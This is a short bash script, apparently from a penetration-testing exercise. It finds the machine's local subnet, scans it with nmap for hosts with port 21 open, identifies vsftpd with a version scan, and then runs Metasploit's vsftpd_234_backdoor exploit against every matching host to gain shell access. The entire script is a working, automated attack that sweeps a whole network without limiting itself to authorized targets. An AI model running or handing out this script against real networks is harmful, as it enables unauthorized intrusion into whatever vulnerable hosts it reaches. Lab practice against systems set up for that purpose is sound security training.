#!/bin/bash

#1.	Scan – check if 21 exists
#2.	Scan using -sV and check if vsftpd is the service
#3.	If vsftpd, run an attack and get access

# get automatically your IP and scan the entire network for the vuln. #ip=192.168.197.131
IPs=$(nmap -p 21 $(ip a | grep global | awk '{print $2}') --open | grep 'report for' | awk '{print $NF}')
#$NF is the last column

for ip in $IPs
do
	if [ ! -z "$(nmap -p21 -sV $ip | grep vsftpd)" ]
	then
		echo "[*] Found Vsftpd on $ip - trying to exploit..."
		msfconsole -qx "use exploit/unix/ftp/vsftpd_234_backdoor;set RHOSTS $ip;run"
	fi	
done


exit



#1.	Scan – check if 21 exists
nmap -sV $ip -p21
